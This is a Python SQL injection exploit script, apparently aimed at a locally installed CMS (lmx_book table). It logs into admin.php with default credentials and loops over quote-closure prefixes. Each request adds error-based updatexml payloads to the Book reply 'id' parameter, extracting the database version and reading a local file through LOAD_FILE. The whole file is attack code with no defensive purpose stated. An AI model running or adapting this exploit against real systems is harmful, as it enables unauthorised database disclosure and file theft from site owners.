from requests_html import HTMLSession

session = HTMLSession()

url = 'http://localhost/admin.php?m=Book&a=reply&id='
payload = ' or updatexml(1,concat(0x7e,version(),0x7e),1)'
payload = ' or updatexml(1,concat(0x7e,LOAD_FILE("C:/users/desktop.ini"),0x7e),1)'
# payload = 'or updatexml(1,concat(0x7e,version(),0x7e),1)'
words_lst = r"""1#
1'#
'1'#
1''#
1"#
1""#
1')#
1'))#
1")#
1"))#
'\'#'
1) or updatexml(1,concat(0x7e,version(),0x7e),1
"""

# 1)  对应sql为 SELECT * FROM lmx_book  WHERE uid in($input)


def login():
    burp0_url = "http://localhost/admin.php?m=login&a=login"
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                     "Origin": "http://localhost", "Content-Type": "application/x-www-form-urlencoded",
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                     "Referer": "http://localhost/admin.php?m=Login", "Accept-Encoding": "gzip, deflate",
                     "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    burp0_data = {"name": "admin", "pwd": "123456", "sub": "\xe7\x99\xbb\xe5\xbd\x95"}
    res = session.post(burp0_url, headers=burp0_headers, data=burp0_data)
    print(res.text)
    print()
    return session


session = login()
for param in words_lst.splitlines():
    # test
    # final_url = url + param
    # final
    final_url = url + param.strip('#') + payload
    print("\n<br>" + final_url, "\n<br>")
    res = session.get(final_url)
    res.encoding = 'utf8'
    print(res.text)
    # exit(0)
